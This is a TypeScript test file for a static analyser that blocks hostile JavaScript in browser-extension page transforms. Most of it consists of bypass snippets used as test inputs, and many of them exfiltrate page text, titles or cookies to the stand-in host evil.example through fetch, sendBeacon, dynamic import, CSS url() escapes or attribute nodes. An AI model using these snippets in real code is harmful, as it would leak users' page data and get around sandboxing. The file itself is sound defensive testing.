import { describe, expect, it } from 'vitest'
import type { Capability } from '@shared/types'
import { wrapTransform } from '../background/harness'
import { analyseJavaScript, applyCapabilityPolicy } from './static-analysis'

const findingApis = (source: string) =>
  analyseJavaScript(source).findings.map((f) => f.api)

/**
 * Runs the same two steps the background gate runs and reports whether any
 * finding blocks saving. Using the real policy step matters: a warning with no
 * capability attached is not raised by it, which is how #49 passed unnoticed.
 */
const blocks = (source: string, declared: Capability[] = []) => {
  const { findings } = applyCapabilityPolicy(analyseJavaScript(source), declared)
  return findings.some((f) => f.severity === 'block')
}

describe('analyseJavaScript', () => {
  it('passes an ordinary DOM transform with no findings', () => {
    const result = analyseJavaScript(`
      const sidebar = document.querySelector('aside[role="complementary"]');
      if (sidebar && !sidebar.dataset.waHidden) {
        sidebar.dataset.waHidden = '1';
        sidebar.style.display = 'none';
      }
    `)
    expect(result.findings).toEqual([])
    expect(result.usedCapabilities).toEqual([])
  })

  it('detects each network egress API', () => {
    expect(findingApis(`fetch('/x')`)).toContain('fetch')
    expect(findingApis(`new XMLHttpRequest()`)).toContain('XMLHttpRequest')
    expect(findingApis(`new WebSocket('wss://x')`)).toContain('WebSocket')
    expect(findingApis(`new EventSource('/x')`)).toContain('EventSource')
    expect(findingApis(`navigator.sendBeacon('/x', d)`)).toContain('navigator.sendBeacon')
    expect(findingApis(`import('./x.js')`)).toContain('import()')
  })

  it('treats window.fetch and globalThis.fetch as the same API', () => {
    expect(findingApis(`window.fetch('/x')`)).toContain('fetch')
    expect(findingApis(`globalThis.fetch('/x')`)).toContain('fetch')
  })

  it('detects credential and storage reads', () => {
    expect(findingApis(`const c = document.cookie`)).toContain('document.cookie')
    expect(findingApis(`localStorage.getItem('t')`)).toContain('localStorage')
    expect(findingApis(`sessionStorage.setItem('a','b')`)).toContain('sessionStorage')
    expect(findingApis(`indexedDB.open('db')`)).toContain('indexedDB')
  })

  it('blocks code-from-string constructs outright', () => {
    for (const source of [
      `eval('alert(1)')`,
      `new Function('return 1')()`,
      `setTimeout("doThing()", 100)`,
      "setInterval(`tick()`, 100)",
    ]) {
      const { findings } = analyseJavaScript(source)
      expect(
        findings.some((f) => f.severity === 'block'),
        `expected a blocking finding for: ${source}`,
      ).toBe(true)
    }
  })

  it('does not flag identifiers that appear inside strings or comments', () => {
    // The whole reason this uses a parser rather than a regex.
    const result = analyseJavaScript(`
      // we deliberately do not call fetch here
      const message = "do not use document.cookie";
      const element = document.body;
      element.textContent = message;
    `)
    expect(result.findings).toEqual([])
  })

  it('flags dynamic property access as unanalysable rather than clean', () => {
    const apis = findingApis(`window[atob('ZmV0Y2g=')]('/x')`)
    expect(apis).toContain('(dynamic property access)')
  })

  it('resolves a key made only of literals, so it is judged by its real name', () => {
    expect(findingApis(`window['fet' + 'ch']('/x')`)).toContain('fetch')
  })

  it('blocks saving when a computed property cannot be resolved (#49)', () => {
    for (const source of [
      `globalThis['fe' + 'tch']('https://evil.example/?c=' + encodeURIComponent(document.body.innerText))`,
      `const c = document['cookie']`,
      `const X = window[atob('WE1MSHR0cFJlcXVlc3Q=')]`,
    ]) {
      expect(blocks(source), `expected a block for: ${source}`).toBe(true)
    }
  })

  it('does not block a computed property that is a plain index', () => {
    // Control: the rule must not simply block every bracket access.
    expect(blocks(`const items = [1], rows = [2]; const first = items[0]; const el = rows[2];`)).toBe(false)
  })

  it('treats numeric indexing as ordinary, not obfuscation', () => {
    const result = analyseJavaScript(`const items = [1], rows = [2]; const first = items[0]; const el = rows[2];`)
    expect(result.findings).toEqual([])
  })

  it('reports unparseable source as blocking rather than clean', () => {
    const result = analyseJavaScript(`function ( {{{`)
    expect(result.parseError).toBeDefined()
    expect(result.findings[0]?.severity).toBe('block')
  })
})

describe('dynamic import (#137)', () => {
  const source = `import('https://evil.example/payload.js')`

  it('blocks import() whether or not network is declared', () => {
    expect(blocks(source, [])).toBe(true)
    expect(blocks(source, ['network'])).toBe(true)
  })

  it('still lets a plain fetch through once network is declared', () => {
    // Control: declaring network must keep unlocking requests, otherwise the
    // test above could pass because everything blocks.
    expect(blocks(`fetch('https://example.com/collect')`, ['network'])).toBe(false)
    expect(blocks(`fetch('https://example.com/collect')`, [])).toBe(true)
  })
})

describe('applyCapabilityPolicy', () => {
  it('raises undeclared capability use from warn to block', () => {
    const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, [])

    expect(undeclared).toEqual(['network'])
    expect(findings.find((f) => f.api === 'fetch')?.severity).toBe('block')
  })

  it('leaves declared capability use as a warning', () => {
    const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, ['network'])

    expect(undeclared).toEqual([])
    expect(findings.find((f) => f.api === 'fetch')?.severity).toBe('warn')
  })

  it('blocks only the undeclared capability when several are used', () => {
    const outcome = analyseJavaScript(`
      const c = document.cookie;
      localStorage.setItem('x', c);
    `)
    const { findings, undeclared } = applyCapabilityPolicy(outcome, ['storage'])

    expect(undeclared).toEqual(['cookies'])
    expect(findings.find((f) => f.api === 'document.cookie')?.severity).toBe('block')
    expect(findings.find((f) => f.api === 'localStorage')?.severity).toBe('warn')
  })
})

/**
 * Every snippet from #48, plus variants of each technique. All run with no
 * capabilities declared, as in the issue.
 */
const BYPASSES: Record<string, string[]> = {
  'aliases of document and navigator': [
    `const n = navigator; n.sendBeacon('https://evil.example', document.body.innerText)`,
    `top.navigator.sendBeacon('https://evil.example', 'x')`,
    `const d = document; const c = d.cookie`,
    `const { cookie } = document`,
    `this.document.cookie`,
    `const w = window; w.fetch('https://evil.example')`,
    `const g = globalThis; g.fetch('https://evil.example')`,
    `self.fetch('https://evil.example')`,
    `parent.document.cookie`,
    `frames[0].document.cookie`,
    `(function (document) { return document.cookie })(globalThis.document)`,
    `document.body.ownerDocument.cookie`,
    `document.body.getRootNode().cookie`,
    `const f = fetch; f('https://evil.example')`,
  ],
  'reflection and property descriptors': [
    `Object.getOwnPropertyDescriptor(Document.prototype, 'coo' + 'kie').get.call(document)`,
    `Object.getOwnPropertyDescriptor(Document.prototype, 'cookie').get.call(document)`,
    `Reflect.get(globalThis, 'fe' + 'tch')('https://evil.example/x')`,
    `Reflect.get(window, 'local' + 'Storage').getItem('token')`,
    `Reflect.apply(fetch, null, ['https://evil.example'])`,
    `new Proxy({}, {})`,
    `const { constructor: C } = []; C.constructor('return 1')()`,
    `document.__lookupGetter__('cookie').call(document)`,
  ],
  'constructor chains': [
    `[].constructor.constructor('return 1')()`,
    `(async () => {}).constructor('return 1')()`,
    `(() => {})['constructor']('return 1')()`,
    `Object.getPrototypeOf(async function () {}).constructor('return 1')()`,
  ],
  'storage and cookie stores': [
    `cookieStore.getAll()`,
    `localStorage.getItem('token')`,
    `window.sessionStorage.getItem('token')`,
    `indexedDB.open('db')`,
  ],
  'string timers and code from strings': [
    `const s = 'void 0'; setTimeout(s)`,
    `setTimeout('void ' + '0')`,
    `setInterval(String('void 0'), 10)`,
    `window.setTimeout('void 0')`,
    `eval('1')`,
    `new Function('return 1')()`,
    `import('https://evil.example/x.js')`,
  ],
  'navigation and messaging': [
    `location.href = 'https://evil.example/?d=' + encodeURIComponent(document.body.innerText)`,
    `window.open('https://evil.example/?d=' + encodeURIComponent(document.title))`,
    `window.postMessage('x', '*')`,
    `postMessage('x', '*')`,
    `document.location = 'https://evil.example'`,
    `history.pushState(null, '', '/x')`,
  ],
  'elements that load or run things': [
    `const s2 = document.createElement('script'); s2.textContent = 'window.x = 1'; document.head.append(s2)`,
    `document.body.append(document.createElement('iframe'))`,
    `document.body.append(document.createElement('img'))`,
    `document.body.append(document.createElement('link'))`,
    `document.body.append(document.createElement('form'))`,
    `document.body.append(document.createElement('object'))`,
    `document.body.append(document.createElement('embed'))`,
    `document.body.append(document.createElement('audio'))`,
    `document.body.append(document.createElement('video'))`,
    `document.body.append(document.createElement('source'))`,
    `document.body.append(document.createElement('base'))`,
    `const t = 'scr' + 'ipt'; document.createElement(t)`,
    `new Image().src = 'https://evil.example/x.gif?' + document.title`,
    `new Audio('https://evil.example/x.mp3')`,
    `const c = document.createElement; c.call(document, 'script')`,
  ],
  'HTML-string and URL sinks': [
    `document.body.insertAdjacentHTML('beforeend', '<img src=x onerror="window.x=1">')`,
    `document.body.innerHTML = '<b>x</b>'`,
    `document.body.innerHTML += '<b>x</b>'`,
    `el.outerHTML = '<b>x</b>'`,
    `document.write('<b>x</b>')`,
    `el.srcdoc = '<script>1</script>'`,
    `el.src = 'https://evil.example/x'`,
    `a.href = 'javascript:void 0'`,
    `form.action = 'https://evil.example'`,
    `form.submit()`,
    `el.setAttribute('src', 'https://evil.example/x')`,
    `el.setAttribute('href', 'https://evil.example/x')`,
    `el.setAttribute('onclick', 'window.x = 1')`,
    `el.setAttribute(name, value)`,
    `el.style.backgroundImage = 'url(https://evil.example/x.gif)'`,
    `el.style.cssText = 'background: url(https://evil.example/x.gif)'`,
    `el.style.setProperty('background-image', 'url(https://evil.example/x.gif)')`,
    `el.style.backgroundImage = 'ur' + 'l(' + x + ')'`,
    `Object.assign(el, { src: 'https://evil.example/x' })`,
    `const { src } = el; ({ src: el.src } = other)`,
    `el.textContent = '@imp' + 'ort "https://evil.example/x.css"'`,
    `el.textContent = '@import url(https://evil.example/x.css)'`,
    `const r = document.createRange(); r.createContextualFragment('<img src=x>')`,
    `el.style.setProperty('--u', 'ur' + 'l(https://evil.example/x)'); el.style.background = 'var(--u)'`,
    `el.style.setProperty('--u', x); el.style.background = 'var(--u)'`,
    `el.style.background = 'var(--u)'`,
    `document.querySelector('meta').setAttribute('http-equiv', 'refresh')`,
    `document.querySelectorAll('div style').length`,
    `document.getElementsByTagName('style')[0]`,
    `el.sheet.insertRule('@import "https://evil.example/x.css"')`,
    `document.createElement('style')`,
    `new DOMParser().parseFromString('<img src=x>', 'text/html')`,
  ],
  'workers and blob URLs': [
    `new Worker('worker.js')`,
    `new Worker(URL.createObjectURL(new Blob(['1'])))`,
    `new SharedWorker('x.js')`,
    `navigator.serviceWorker.register('x.js')`,
  ],
  'network APIs through other routes': [
    `fetch('https://evil.example')`,
    `navigator.sendBeacon('https://evil.example', 'x')`,
    `new WebSocket('wss://evil.example')`,
    `new EventSource('https://evil.example')`,
    `new XMLHttpRequest()`,
    `new BroadcastChannel('x')`,
  ],
  'unresolvable access': [
    `globalThis['fe' + 'tch']('https://evil.example')`,
    `const k = 'cookie'; document[k]`,
    `const obj = {}; obj[someName]`,
    `with (document) { cookie }`,
  ],
}

/** Realistic transforms, written in the shapes the generation prompt asks for. */
const LEGITIMATE: Record<string, string> = {
  'hide an element once, guarded by a marker': `
    const sidebar = document.querySelector('aside[role="complementary"]');
    if (sidebar && !sidebar.dataset.waHidden) {
      sidebar.dataset.waHidden = '1';
      sidebar.style.display = 'none';
    }`,
  'hide every element of a set': `
    document.querySelectorAll('[data-ad], .promo-banner').forEach((el) => {
      if (el.dataset.waHidden) return;
      el.dataset.waHidden = '1';
      el.style.setProperty('display', 'none', 'important');
    });`,
  'toggle classes and attributes': `
    const nav = document.querySelector('nav[aria-label="Main"]');
    if (nav && !nav.classList.contains('wa-compact')) {
      nav.classList.add('wa-compact');
      nav.setAttribute('aria-expanded', 'false');
      nav.setAttribute('data-wa', 'compact');
      nav.removeAttribute('hidden');
    }`,
  'rewrite visible text': `
    for (const el of document.querySelectorAll('h2.title')) {
      const text = el.textContent.trim();
      if (!text.startsWith('[')) el.textContent = '[' + text + ']';
    }`,
  'insert a button with a click listener, once': `
    const header = document.querySelector('header');
    if (header && !header.querySelector('.wa-top')) {
      const button = document.createElement('button');
      button.className = 'wa-top';
      button.type = 'button';
      button.textContent = 'Top';
      button.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
      header.append(button);
    }`,
  'reorder list items with an indexed loop': `
    const list = document.querySelector('ul.results');
    if (list && !list.dataset.waSorted) {
      list.dataset.waSorted = '1';
      const items = Array.from(list.children);
      items.sort((a, b) => a.textContent.localeCompare(b.textContent));
      for (let i = 0; i < items.length; i++) list.appendChild(items[i]);
      const last = items[items.length - 1];
      if (last) last.classList.add('wa-last');
    }`,
  'read computed style and set sizes': `
    const card = document.querySelector('article');
    if (card && !card.dataset.waSized) {
      card.dataset.waSized = '1';
      const style = getComputedStyle(card);
      const width = parseFloat(style.width);
      card.style.maxWidth = Math.min(width, 720) + 'px';
      card.style.fontSize = '18px';
      card.style.color = 'inherit';
    }`,
  'wrap an element in a new container': `
    const video = document.querySelector('main video');
    if (video && !video.parentElement.classList.contains('wa-wrap')) {
      const wrap = document.createElement('div');
      wrap.classList.add('wa-wrap');
      video.parentElement.insertBefore(wrap, video);
      wrap.appendChild(video);
    }`,
  'build content with text nodes and a template of spans': `
    const row = document.querySelector('.row');
    if (row && !row.querySelector('.wa-count')) {
      const span = document.createElement('span');
      span.className = 'wa-count';
      span.append(document.createTextNode(String(row.children.length) + ' items'));
      row.prepend(span);
    }`,
  'observe changes and delay work': `
    const target = document.querySelector('main');
    const trim = () => {
      for (const el of document.querySelectorAll('.promoted')) el.remove();
    };
    if (target) {
      new MutationObserver(() => requestAnimationFrame(trim)).observe(target, { childList: true });
      setTimeout(trim, 500);
    }`,
  'keyboard shortcut on the document': `
    if (!document.body.dataset.waKeys) {
      document.body.dataset.waKeys = '1';
      document.addEventListener('keydown', (event) => {
        if (event.key === 'j') document.querySelector('.next')?.click();
      });
    }`,
  'read a link address without changing it': `
    const links = Array.from(document.querySelectorAll('a[href]'));
    const external = links.filter((a) => a.href.startsWith('http') && !a.dataset.waSeen);
    for (const a of external) { a.dataset.waSeen = '1'; a.title = a.hostname; }`,
  'wait with a promise, then act': `
    (async () => {
      await new Promise((resolve) => setTimeout(resolve, 200));
      const panel = document.querySelector('[role="dialog"]');
      if (panel) panel.hidden = true;
    })();`,
  'open a details element and set colours from variables': `
    for (const d of document.querySelectorAll('details:not([open])')) d.open = true;
    const colour = getComputedStyle(document.body).color;
    const bar = document.querySelector('.bar');
    if (bar) { bar.style.backgroundColor = colour; bar.style.cursor = colour ? 'pointer' : 'default'; }
    document.querySelectorAll('div[style*="width"]').forEach((n) => n.style.removeProperty('width'));`,
  'assign styles from an object literal': `
    const bar = document.querySelector('.bar');
    if (bar) Object.assign(bar.style, { position: 'sticky', top: '0px', zIndex: '10' });`,
}

/**
 * Declares the names the bypass snippets use freely, so that a snippet blocks
 * because of the technique it demonstrates and not because it mentions an
 * undeclared variable. The preamble itself must pass; see the control below.
 */
const PREAMBLE =
  `const el = document.querySelector('x'); const a = el, form = el, other = el; ` +
  `const name = 'x', value = 'y', x = 'z', someName = 'k';\n`

describe('allowlist (#48): bypasses are blocked', () => {
  it('control: the preamble alone passes, so it hides no reason to block', () => {
    expect(blocks(PREAMBLE)).toBe(false)
    expect(blocks(PREAMBLE + `el.textContent = name + value;`)).toBe(false)
  })

  for (const [group, snippets] of Object.entries(BYPASSES)) {
    for (const snippet of snippets) {
      it(`${group}: ${snippet}`, () => {
        expect(blocks(PREAMBLE + snippet)).toBe(true)
      })
    }
  }

  it('lets a declared capability unlock only what it names', () => {
    expect(blocks(`fetch('/x')`, ['network'])).toBe(false)
    expect(blocks(`localStorage.getItem('a')`, ['storage'])).toBe(false)
    expect(blocks(`const c = document.cookie`, ['cookies'])).toBe(false)
    // A declared capability does not unlock aliasing or reflection.
    expect(blocks(`const d = document; d.cookie`, ['cookies'])).toBe(true)
    expect(blocks(`Reflect.get(globalThis, 'fetch')('/x')`, ['network'])).toBe(true)
    expect(blocks(`localStorage.getItem('a')`, ['network'])).toBe(true)
  })
})

describe('allowlist (#48): legitimate transforms still pass', () => {
  for (const [name, code] of Object.entries(LEGITIMATE)) {
    it(`passes: ${name}`, () => {
      const { findings } = applyCapabilityPolicy(analyseJavaScript(code), [])
      expect(findings, JSON.stringify(findings)).toEqual([])
    })

    it(`passes inside the harness: ${name}`, () => {
      const wrapped = wrapTransform({
        name: 'test',
        anchor: { landmarks: ['main', '[role="main"]'] },
        code,
      } as unknown as Parameters<typeof wrapTransform>[0])
      expect(blocks(wrapped)).toBe(false)
    })
  }

  it('does not pass because the analyser blocks everything', () => {
    // Control for the two groups above: the same helper must report both
    // outcomes, and a legitimate snippet must differ from a hostile one only
    // in the thing that is hostile.
    expect(blocks(`document.querySelector('a').textContent = 'x'`)).toBe(false)
    expect(blocks(`document.querySelector('a').innerHTML = 'x'`)).toBe(true)
  })
})

/**
 * Gaps found by the audit of 00cc5f7 (#48). Each snippet is the one the
 * auditor reported, run through the analyser and the capability policy with
 * no capability declared unless the test says otherwise.
 */
describe('audit of 00cc5f7 (#48): logical assignment', () => {
  const SNIPPETS = [
    `let k = 0; k ||= 'constructor'; [][k][k]('return 1')()`,
    `let k; k ??= 'constructor'; [][k][k]('return 1')()`,
    `let k = 1; k &&= 'constructor'; [][k][k]('return 1')()`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks a logical assignment of text to a custom style property', () => {
    expect(blocks(`const el = document.body; let v = 1; v ||= el.textContent; el.style.setProperty('--u', v)`)).toBe(true)
    expect(blocks(`const el = document.body; el.style['--u'] ||= el.textContent`)).toBe(true)
    expect(blocks(`const el = document.body; el.style['--u'] += 'l(https://evil.example/)'`)).toBe(true)
  })

  it('controls: a logical assignment of a number still counts as numeric', () => {
    expect(blocks(`let k = 0; k ||= 2; const a = [1, 2, 3]; a[k]`)).toBe(false)
    expect(blocks(`let k; k ??= 1; const a = [1, 2, 3]; a[k]`)).toBe(false)
    expect(blocks(`let k = 3; k -= 1; k *= 2; const a = [1, 2, 3]; a[k]`)).toBe(false)
    expect(blocks(`let k = 0; k += 1; const a = [1, 2]; a[k]`)).toBe(false)
    expect(blocks(`const el = document.body; let n = 1; n ||= 2; el.style.setProperty('--n', n)`)).toBe(false)
  })
})

describe('audit of 00cc5f7 (#48): routes to the window and document values', () => {
  const SNIPPETS = [
    `setTimeout(function () { const w = this; const o = w.open; o.call(w, 'https://evil.example/?' + document.title) }, 0)`,
    `window.addEventListener('focus', (e) => { const w = e.target; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() })`,
    `setTimeout(function () { new this.AudioContext().audioWorklet.addModule('https://evil.example/x.js') }, 0)`,
    `setTimeout(function () { const f = Object.entries(this).find(([n]) => n === 'fe' + 'tch')[1]; f('https://evil.example') }, 0)`,
    `window.addEventListener('focus', (e) => { e.target.navigator.clipboard.readText().then((t) => document.title = t) })`,
    `const d = document.documentElement.parentNode; const { open } = d; open.call(d, 'https://evil.example/?' + document.title, '', '')`,
    `const d = document.body.getRootNode(); const o = d.open; o.call(d, 'https://evil.example/', 'x', '')`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks this in a function that is not a class or object method', () => {
    for (const source of [
      `setInterval(function tick() { const w = this }, 10)`,
      `function f() { return this } setTimeout(f, 0)`,
      `const f = function () { return this }; f()`,
      `(function () { return this })()`,
      `window.addEventListener('x', function () { this.open('https://evil.example') })`,
      `const o = { handler: function () { return this } }`,
      `class A { handler = function () { return this } }`,
      `[1].forEach(function () { const w = this })`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('blocks a method that can be handed to a window or document listener', () => {
    // A listener function is called with this set to the object it is on, so
    // a method passed there would receive the window.
    expect(blocks(`const o = { f() { return this } }; window.addEventListener('x', o.f)`)).toBe(true)
    expect(blocks(`class A { f() { return this } } document.addEventListener('x', new A().f)`)).toBe(true)
    expect(blocks(`document.addEventListener('x', { handleEvent(e) { return e } })`)).toBe(true)
    expect(blocks(`const h = () => 1; window.addEventListener('x', h)`)).toBe(true)
  })

  it('blocks every route from a window or document listener to its event target', () => {
    for (const name of ['target', 'currentTarget', 'srcElement', 'originalTarget', 'explicitOriginalTarget', 'view']) {
      expect(blocks(`document.addEventListener('x', (e) => { const t = e.${name}; })`), name).toBe(true)
      expect(blocks(`window.addEventListener('x', function (e) { return e.${name} })`), name).toBe(true)
    }
    for (const source of [
      `document.addEventListener('x', (e) => { const { target } = e })`,
      `document.addEventListener('x', ({ target }) => target)`,
      `document.addEventListener('x', (e) => { const f = e; f.target })`,
      `document.addEventListener('x', (e) => { helper(e) }); function helper(ev) { return ev.key }`,
      `document.addEventListener('x', (...args) => args[0])`,
      `document.addEventListener('x', function () { return arguments[0] })`,
      `window.addEventListener('x', (e) => { document.body.addEventListener('y', () => e.currentTarget) })`,
      `window.addEventListener('x', (e) => e.composedPath())`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('blocks getRootNode, and parentNode unless the result is used at once', () => {
    for (const source of [
      `document.body.getRootNode()`,
      `document.body.getRootNode({ composed: true }).title`,
      `const p = document.body.parentNode; p.title`,
      `document.documentElement.parentNode.parentNode`,
      `let n = document.body; while (n.parentNode) n = n.parentNode`,
      `const { parentNode } = document.body`,
      `document.createTreeWalker(document.body).parentNode()`,
      `document.body.parentNode.open('https://evil.example')`,
      `document.body.parentNode.defaultView`,
      `document.getSelection().anchorNode`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('blocks Object.entries, values, keys and getOwnPropertyNames on values that are not written out', () => {
    for (const method of ['entries', 'values', 'keys', 'getOwnPropertyNames']) {
      expect(blocks(`Object.${method}(document.body)`), method).toBe(true)
      expect(blocks(`Object.${method}(document.body.dataset)`), method).toBe(true)
      expect(blocks(`let o = { a: 1 }; o = document.body; Object.${method}(o)`), method).toBe(true)
      expect(blocks(`Object.${method}({ ...document.body.dataset })`), method).toBe(true)
      expect(blocks(`const f = Object.${method}; f({})`), method).toBe(true)
      expect(blocks(`const O = Object; O.${method}({})`), method).toBe(true)
      expect(blocks(`const { ${method} } = Object`), method).toBe(true)
    }
    // An alias of Object would also skip the Object.assign check.
    expect(blocks(`const O = Object; O.assign(document.body, { src: 'x' })`)).toBe(true)
  })

  it('blocks reading or destructuring open, but not setting it', () => {
    expect(blocks(`const d = document.querySelector('details'); const o = d.open`)).toBe(true)
    expect(blocks(`const { open } = document.querySelector('details')`)).toBe(true)
    expect(blocks(`const d = document.querySelector('details'); d.open = !d.open`)).toBe(true)
    expect(blocks(`const d = document.querySelector('details'); d.open ||= true`)).toBe(true)
    expect(blocks(`const d = document.querySelector('details'); [d.open] = [true]`)).toBe(true)
  })

  it('controls: the ordinary forms of the same code still pass', () => {
    for (const source of [
      `class A { n = 1; bump() { this.n++; return this.n } } new A().bump()`,
      `class A { n = 1; static s = 2; static { this.s = 3 } } new A()`,
      `const o = { n: 1, bump() { this.n++ }, get double() { return this.n * 2 } }; o.bump()`,
      `class A { run() { setTimeout(() => { this.n = 1 }, 10) } } new A().run()`,
      `window.addEventListener('resize', () => { document.body.dataset.w = String(window.innerWidth) })`,
      `document.addEventListener('keydown', (e) => { if (e.key === 'j') e.preventDefault() })`,
      `window.addEventListener('scroll', function (event) { return event.type })`,
      `const b = document.createElement('button'); b.addEventListener('click', (e) => e.target.closest('a'))`,
      `const b = document.body; b.addEventListener('click', function (e) { return e.currentTarget.id })`,
      `const el = document.body.firstElementChild; el.parentNode.removeChild(el)`,
      `const el = document.body.firstElementChild; el.parentNode.insertBefore(document.createElement('div'), el)`,
      `const el = document.body.firstElementChild; el.parentNode.appendChild(el)`,
      `const el = document.body.firstElementChild; const p = el.parentElement; p.classList.add('x')`,
      `const e = Object.entries({ a: 1, b: 2 }); e.length`,
      `const colours = { a: 'red', b: 'blue' }; Object.keys(colours).length; Object.values(colours)`,
      `const keys = Object.getOwnPropertyNames(['x']); keys.length`,
      `const o = Object.assign({}, { a: 1 }); o instanceof Object; Object(1); new Object()`,
      `const m = new Map([['a', 1]]); for (const k of m.keys()) k; for (const v of m.values()) v; m.entries()`,
      `const d = document.querySelector('details'); if (d) d.open = true`,
      `const d = document.querySelector('details'); if (d) d.setAttribute('open', '')`,
      `document.querySelectorAll('details:not([open])').forEach((d) => d.toggleAttribute('data-wa'))`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})

describe('audit of 00cc5f7 (#48): attribute nodes and namespaced tag selectors', () => {
  const SNIPPETS = [
    `const b = document.createElement('button'); b.toggleAttribute('onclick'); b.getAttributeNode('onclick').value = 'al' + 'ert(1)'; document.body.append(b); b.click()`,
    `document.querySelector('img').getAttributeNode('src').value = 'https://evil.example/?' + document.title`,
    `const a = document.createElement('a'); a.toggleAttribute('href'); a.getAttributeNode('href').nodeValue = 'https://evil.example/?' + document.title; a.click()`,
    `const u = 'ur'; document.head.getElementsByTagNameNS('*', 'style')[0].textContent = 'body{background:' + u + 'l(https://evil.example/?' + document.title + ')}'`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('blocks every way to get an attribute as a node', () => {
    for (const source of [
      `document.body.getAttributeNode('title')`,
      `document.body.getAttributeNodeNS(null, 'title')`,
      `document.body.setAttributeNode(document.createAttribute('title'))`,
      `document.body.attributes[0].value`,
      `const { getAttributeNode } = document.body`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('checks toggleAttribute names the way setAttribute names are checked', () => {
    for (const source of [
      `document.body.toggleAttribute('onclick')`,
      `document.body.toggleAttribute('onmouseover', true)`,
      `document.body.toggleAttribute('href')`,
      `document.body.toggleAttribute('src', true)`,
      `document.body.toggleAttribute('srcdoc')`,
      `document.body.toggleAttribute('http-equiv')`,
      `const n = 'x'; document.body.toggleAttribute(n)`,
      `const t = document.body.toggleAttribute; t.call(document.body, 'onclick')`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
    // Declared network use unlocks an address attribute, as for setAttribute.
    expect(blocks(`document.body.toggleAttribute('href')`, ['network'])).toBe(false)
    expect(blocks(`document.body.toggleAttribute('onclick')`, ['network'])).toBe(true)
  })

  it('checks the tag name of every selector method that takes one', () => {
    for (const source of [
      `document.body.getElementsByTagNameNS('*', 'script')`,
      `document.body.getElementsByTagNameNS('http://www.w3.org/1999/xhtml', 'style')`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('controls: ordinary attribute toggles and namespaced selectors still pass', () => {
    for (const source of [
      `document.body.toggleAttribute('hidden')`,
      `document.body.toggleAttribute('data-wa', true)`,
      `document.body.toggleAttribute('aria-hidden', false)`,
      `document.body.getElementsByTagNameNS('*', 'div')`,
      `document.body.getElementsByTagNameNS('http://www.w3.org/2000/svg', 'path')`,
    ]) {
      expect(blocks(source), source).toBe(false)
    }
  })
})

describe('audit of 00cc5f7 (#48): CSS escapes and style paths', () => {
  // String.raw keeps the backslashes exactly as the audit wrote them.
  const SNIPPETS = [
    String.raw`document.body.style.backgroundImage = 'u\\72 l(https://evil.example/p)'`,
    String.raw`document.body.style.cssText = 'background:\\75 rl(https://evil.example/p)'`,
    `const u = 'ur'; document.body.animate([{ backgroundImage: u + 'l(https://evil.example/?' + document.title + ')' }], 100000)`,
    `const u = 'ur'; document.querySelector('svg path').style.fill = u + 'l(https://evil.example/?' + document.title + '#a)'`,
  ]
  for (const snippet of SNIPPETS) {
    it(`blocks: ${snippet}`, () => {
      expect(blocks(snippet)).toBe(true)
    })
  }

  it('reads escapes in style text before looking for url(), @import and the like', () => {
    for (const source of [
      String.raw`document.body.style.setProperty('background-image', 'U\\52 L(https://evil.example/p)')`,
      String.raw`document.body.style.background = '\\75\\72\\6c(https://evil.example/p)'`,
      String.raw`document.body.style.background = 'ur\\6c (https://evil.example/p)'`,
      String.raw`document.body.style.background = '\\u\\r\\l(https://evil.example/p)'`,
      String.raw`document.body.textContent = '@\\69mport "https://evil.example/x.css"'`,
      String.raw`document.body.style.setProperty('--u', 'u\\72 l(https://evil.example/p)')`,
      String.raw`document.body.style.background = 'u\\72' + 'l(https://evil.example/p)'`,
      String.raw`document.body.style.background = 'v\\61 r(--u)'`,
      String.raw`document.body.style.background = '\\69mage-set(x 1x)'`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
    // With network declared the same text is a use of that capability, not a block.
    expect(blocks(String.raw`document.body.style.backgroundImage = 'u\\72 l(https://evil.example/p)'`, ['network'])).toBe(false)
  })

  it('checks every keyframe of element.animate', () => {
    for (const source of [
      `document.body.animate([{ backgroundImage: 'url(https://evil.example/x)' }], 100)`,
      `document.body.animate({ backgroundImage: ['none', 'url(https://evil.example/x)'] }, 100)`,
      `document.body.animate({ 'background-image': 'url(https://evil.example/x)' }, 100)`,
      `document.body.animate([{ background: 'var(--u)' }], 100)`,
      `document.body.animate([{ '--u': document.title }], 100)`,
      `const k = [{ opacity: 0 }]; document.body.animate(k, 100)`,
      `document.body.animate([{ opacity: 0 }, ...window.frames], 100)`,
      `document.body.animate([{ [document.title]: 'x' }], 100)`,
      `document.body.animate([{ opacity: 0 }], 100).effect.setKeyframes([{ backgroundImage: 'url(https://evil.example/x)' }])`,
      `new KeyframeEffect(document.body, [{ backgroundImage: 'url(https://evil.example/x)' }])`,
    ]) {
      expect(blocks(source), source).toBe(true)
    }
  })

  it('refuses the style properties that can hold a url() paint, marker, clip or mask', () => {
    for (const name of ['fill', 'stroke', 'marker', 'markerStart', 'markerMid', 'markerEnd', 'clipPath', 'mask', 'webkitBoxReflect']) {
      expect(blocks(`document.body.style.${name} = 'url(https://evil.example/x#a)'`), name).toBe(true)
      expect(blocks(`document.body.style.${name} = document.title`), name).toBe(true)
    }
    for (const name of ['fill', 'stroke', 'marker-start', 'marker-mid', 'marker-end', 'clip-path', 'mask', '-webkit-box-reflect']) {
      expect(blocks(`document.body.style.setProperty('${name}', document.title)`), name).toBe(true)
    }
  })

